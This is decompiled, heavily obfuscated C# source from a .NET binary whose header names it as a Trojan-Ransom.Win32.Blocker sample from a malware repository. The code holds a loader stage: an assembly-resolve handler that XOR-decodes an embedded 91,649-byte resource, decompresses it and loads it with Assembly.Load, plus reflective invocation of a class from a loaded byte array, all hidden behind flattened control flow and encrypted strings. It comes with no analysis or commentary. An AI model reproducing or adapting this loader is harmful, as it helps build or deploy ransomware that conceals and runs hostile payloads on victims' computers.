// Decompiled with JetBrains decompiler
// Type: Ⴃ.Ⴈ
// Assembly: Final, Version=3.19.0.1745, Culture=neutral, PublicKeyToken=null
// MVID: 912F5519-7248-44E3-B098-F33E871EBECC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.aitk-30127cc094a284d2b7badec68076f9f82c11bf424936b29e96d1d35a5ad4f898.exe

using Final;
using Final.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Windows.Forms;

namespace Ⴃ
{
  [StandardModule]
  internal sealed class Ⴈ
  {
    static Ⴈ() => MyComputer.ႨႨ();

    internal static bool Ⴀ([In] WindowsFormsApplicationBase obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 91:
          num1 = 7;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 2:
          case 5:
            num2 = 6;
            continue;
          case 4:
            num2 = 6;
            continue;
          case 6:
            goto label_3;
          case 7:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴀ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return obj0.SaveMySettingsOnExit;
    }

    internal static object Ⴄ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 63:
          num1 = 4;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            num2 = 2;
            continue;
          case 1:
            num2 = 2;
            continue;
          case 2:
            goto label_3;
          case 3:
          case 4:
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴄ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return Activator.CreateInstance(obj0);
    }

    internal static AppDomain Ⴍ([In] int obj0, [In] int obj1)
    {
label_0:
      switch ((obj1 ^ obj0) - 25)
      {
        case 0:
          return AppDomain.CurrentDomain;
        default:
          goto label_0;
      }
    }

    public sealed class Ⴓ
    {
      internal static Ⴈ.Ⴓ.Ⴐ Ⴍ;
      private static readonly char[] ႰႰ;
      private static readonly char[] ႰႭ = new char[8]
      {
        char.MinValue,
        '\u0005',
        char.MinValue,
        'ժ',
        '\u2E57',
        'ҡ',
        '㤀',
        '\u0E6D'
      };
      private static readonly string[] ႰႤ;
      internal static Ⴈ.Ⴓ.ႰႷ ႰႨ;

      public static object Ⴓ(byte[] Ⴗ, string Ⴈ, string Ⴅ, object[] Ⴍ)
      {
label_3:
        System.Type[] typeArray = Ⴅ.Ⴜ(Ⴃ.Ⴃ.Ⴍ(Ⴗ, 196, 232), 131, 152);
label_4:
        int num = 13;
        int index;
        System.Type type;
        object obj1;
        object objectValue;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 3:
              goto label_3;
            case 1:
              num = !MyComputer.Ⴜ(Ⴃ.Ⴃ.Ⴀ(type, 807, 810), MyApplication.Ⴈ(MyComputer.Ⴈ(307275449, 1), Ⴈ, 34, 98), 564, 590) ? 6 : 4;
              continue;
            case 2:
              goto label_10;
            case 4:
              obj1 = Ⴈ.Ⴓ.Ⴈ(Ⴈ.Ⴄ(type, 591, 624), 410, 453);
              num = 8;
              continue;
            case 6:
              checked { ++index; }
              num = 10;
              continue;
            case 7:
            case 11:
              goto label_13;
            case 8:
              objectValue = RuntimeHelpers.GetObjectValue(type.InvokeMember(Ⴅ, BindingFlags.InvokeMethod, (Binder) null, RuntimeHelpers.GetObjectValue(obj1), Ⴍ));
              num = 2;
              continue;
            case 9:
              goto label_4;
            case 10:
              num = index < typeArray.Length ? 12 : 11;
              continue;
            case 12:
              type = typeArray[index];
              num = !Ⴈ.Ⴓ.Ⴅ(type, 509, 466) ? 6 : 1;
              continue;
            case 13:
              index = 0;
              num = 10;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴓ);
              num = 0;
              continue;
          }
        }
label_10:
        return objectValue;
label_13:
        object obj2;
        return obj2;
      }

      static Ⴓ()
      {
        char[] chArray = new char[8]
        {
          char.MinValue,
          char.MinValue,
          char.MinValue,
          char.MinValue,
          char.MinValue,
          '㻯',
          '⡏',
          char.MinValue
        };
        chArray[3] = '㤹';
        chArray[2] = 'Ґ';
        chArray[7] = '☎';
        chArray[4] = 'ฯ';
        chArray[0] = 'Շ';
        chArray[1] = '\u2E62';
        Ⴈ.Ⴓ.ႰႤ = new string[1];
        Ⴈ.Ⴓ.ႰႰ = chArray;
        MyComputer.ႨႨ();
      }

      internal static Assembly Ⴄ([In] object obj0, [In] ResolveEventArgs obj1) => Ⴈ.Ⴓ.Ⴗ(obj1, __fieldref (Ⴈ.Ⴓ.Ⴍ), 91649, "565b6e9e-be65-4c42-b1ff-5bf9c3f30b5e", 166);

      internal static Assembly Ⴗ(
        ResolveEventArgs args,
        RuntimeFieldHandle resourceField,
        int resourceLength,
        string nameGuid,
        int offset)
      {
label_3:
        while (resourceLength > 0)
        {
          int num1 = 13;
          Assembly assembly1;
          string name;
          AppDomain appDomain;
          Dictionary<string, string> dictionary;
          byte[] buffer;
          int index1;
          while (true)
          {
            switch (num1)
            {
              case 0:
                num1 = index1 < resourceLength ? 1 : 4;
                continue;
              case 1:
                buffer[index1] ^= (byte) (index1 + offset & (int) byte.MaxValue);
                num1 = 5;
                continue;
              case 2:
                goto label_3;
              case 3:
                dictionary = new Dictionary<string, string>();
                MyApplication.Ⴃ(appDomain, nameGuid, (object) dictionary, 81, 41);
                buffer = new byte[resourceLength];
                num1 = 7;
                continue;
              case 4:
                goto label_15;
              case 5:
                ++index1;
                num1 = 0;
                continue;
              case 6:
                dictionary = (Dictionary<string, string>) MyApplication.Ⴐ(appDomain, nameGuid, 688, 676);
                num1 = 8;
                continue;
              case 7:
              case 12:
                Ⴈ.Ⴓ.ႰႣ((Array) buffer, resourceField, 290, 349);
                index1 = 0;
                num1 = 0;
                continue;
              case 8:
                if (dictionary == null)
                {
                  num1 = 3;
                  continue;
                }
                goto label_36;
              case 9:
              case 13:
                assembly1 = Ⴈ.Ⴓ.ႰႥ(114, 75);
                name = Form1.ႥႰ(nameGuid, Ⴈ.Ⴓ.ႰႳ(307275508, 6), 938, 901);
                num1 = 10;
                continue;
              case 10:
                appDomain = Ⴈ.Ⴍ(641, 664);
                goto case 6;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴗ);
                num1 = 2;
                continue;
            }
          }
label_15:
          MemoryStream memoryStream = new MemoryStream();
          DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
          try
          {
            int num2 = 6;
            byte[] numArray;
            int num3;
            while (true)
            {
              switch (num2)
              {
                case 1:
                case 2:
                  goto label_27;
                case 3:
                  num2 = (num3 = MyApplication.Ⴓ((Stream) deflateStream, numArray, 0, numArray.Length, 758, 685)) > 0 ? 4 : 1;
                  continue;
                case 4:
                  Form1.ႥႥ((Stream) memoryStream, numArray, 0, num3, 633, 547);
                  goto case 3;
                case 7:
                  num2 = 3;
                  continue;
                default:
                  numArray = new byte[1024];
                  goto case 7;
              }
            }
          }
          finally
          {
            int num4 = 5;
            while (true)
            {
              switch (num4)
              {
                case 0:
                case 3:
                case 6:
                  goto label_25;
                case 2:
                  goto label_26;
                default:
                  num4 = deflateStream == null ? 2 : 0;
                  continue;
              }
            }
label_25:
            deflateStream.Dispose();
label_26:;
          }
label_27:
          int num5 = 8;
label_28:
          Assembly assembly2;
          string[] strArray;
          int index2;
          string key;
          while (true)
          {
            switch (num5)
            {
              case 0:
                num5 = index2 < strArray.Length ? 6 : 2;
                continue;
              case 1:
                goto label_36;
              case 2:
                num5 = 12;
                continue;
              case 3:
              case 4:
                index2 = 0;
                num5 = 0;
                continue;
              case 5:
                goto label_39;
              case 6:
                key = strArray[index2];
                goto case 11;
              case 7:
              case 10:
                MyApplication.Ⴃ(appDomain, name, (object) assembly2, 620, 533);
                strArray = MyComputer.ႨႰ(assembly2, 945, 915);
                num5 = 3;
                continue;
              case 9:
                goto label_38;
              case 11:
                dictionary[key] = key;
                ++index2;
                num5 = 0;
                continue;
              case 12:
                num5 = !dictionary.ContainsKey(args.Name) ? 5 : 9;
                continue;
              default:
                assembly2 = Ⴈ.Ⴓ.ႰႠ(Form1.ႥႨ(memoryStream, 819, 811), (byte[]) null, MyComputer.ႨႥ(assembly1, 832, 830), 248, 252);
                num5 = 7;
                continue;
            }
          }
label_38:
          return assembly2;
label_36:
          assembly2 = (Assembly) appDomain.GetData(name);
          num5 = 12;
          goto label_28;
        }
label_39:
        return (Assembly) null;
      }

      internal static object Ⴈ([In] object obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 95:
            num1 = 1;
            break;
          default:
            num1 = 5;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_3;
            case 1:
            case 2:
            case 6:
              goto label_8;
            case 4:
              num2 = 0;
              continue;
            case 5:
              num2 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴈ);
              num2 = 0;
              continue;
          }
        }
label_8:
        return RuntimeHelpers.GetObjectValue(obj0);
      }

      internal static bool Ⴅ([In] System.Type obj0, [In] int obj1, [In] int obj2)
      {
label_3:
        int num1;
        switch (obj2 ^ obj1)
        {
          case 47:
            num1 = 2;
            break;
          default:
            num1 = 5;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
            case 7:
              num2 = 6;
              continue;
            case 2:
            case 3:
              goto label_8;
            case 5:
              num2 = 6;
              continue;
            case 6:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴅ);
              num2 = 6;
              continue;
          }
        }
label_8:
        return obj0.IsClass;
      }

      internal static void Ⴃ([In] Control obj0, [In] int obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 2;
        while (true)
        {
          switch (num1)
          {
            case 1:
              goto label_7;
            case 4:
              num1 = 2;
              continue;
            case 5:
              goto label_8;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 3:
                  num2 = 1;
                  break;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.TabIndex = obj1;
      }

      internal static MsgBoxResult Ⴀ(
        [In] object obj0,
        [In] MsgBoxStyle obj1,
        [In] object obj2,
        [In] int obj3,
        [In] int obj4)
      {
label_3:
        int num1;
        switch (obj4 ^ obj3)
        {
          case 13:
            num1 = 7;
            break;
          default:
            num1 = 4;
            break;
        }
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              goto label_3;
            case 2:
            case 7:
              goto label_8;
            case 3:
              num2 = 6;
              continue;
            case 4:
            case 5:
              num2 = 6;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴀ);
              num2 = 6;
              continue;
          }
        }
label_8:
        return Interaction.MsgBox(obj0, obj1, obj2);
      }

      internal static void Ⴜ([In] Control obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
      {
        int num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 1:
              goto label_8;
            case 2:
            case 5:
              goto label_7;
            case 3:
            case 4:
              num1 = 0;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 96:
                  num2 = 5;
                  break;
                default:
                  num2 = 3;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.Visible = obj1;
      }

      internal static string ႰႳ([In] int obj0, [In] int obj1)
      {
        int index1 = obj0 ^ 307275506 ^ obj1;
        char[] ⴐⴍ = Ⴈ.Ⴓ.ႰႭ;
        int index2 = (int) ⴐⴍ[index1];
        string str1;
        if ((str1 = Ⴈ.Ⴓ.ႰႤ[index2]) != null)
          return str1;
        int num1 = (int) ⴐⴍ[index1 + 1];
        int length1 = ((int) ⴐⴍ[index1 + 2] << 16) + num1;
        char[] chArray = new char[length1];
        char[] ⴐⴐ = Ⴈ.Ⴓ.ႰႰ;
        int length2 = ⴐⴐ.Length;
        int num2 = index1 + 3;
        for (int index3 = 0; index3 < length1; index3 = 1 + index3)
          chArray[index3] = (char) ((uint) ⴐⴍ[num2 + index3] ^ (uint) ⴐⴐ[(index3 + index2) % length2]);
        string str2 = new string(chArray);
        Ⴈ.Ⴓ.ႰႤ[index2] = str2;
        return str2;
      }

      internal static Assembly ႰႥ([In] int obj0, [In] int obj1)
      {
label_0:
        switch ((obj1 ^ obj0) - 57)
        {
          case 0:
            return Assembly.GetExecutingAssembly();
          default:
            goto label_0;
        }
      }

      internal static void ႰႣ([In] Array obj0, [In] RuntimeFieldHandle obj1, [In] int obj2, [In] int obj3)
      {
label_0:
        switch ((obj3 ^ obj2) - (int) sbyte.MaxValue)
        {
          case 0:
            RuntimeHelpers.InitializeArray(obj0, obj1);
            break;
          default:
            goto label_0;
        }
      }

      internal static Assembly ႰႠ(
        [In] byte[] obj0,
        [In] byte[] obj1,
        [In] Evidence obj2,
        [In] int obj3,
        [In] int obj4)
      {
label_0:
        switch ((obj4 ^ obj3) - 4)
        {
          case 0:
            return Assembly.Load(obj0, obj1, obj2);
          default:
            goto label_0;
        }
      }

      [StructLayout(LayoutKind.Explicit, Size = 91649, Pack = 1)]
      private struct Ⴐ
      {
      }

      [StructLayout(LayoutKind.Explicit, Size = 16, Pack = 1)]
      private struct ႰႷ
      {
      }
    }
  }
}
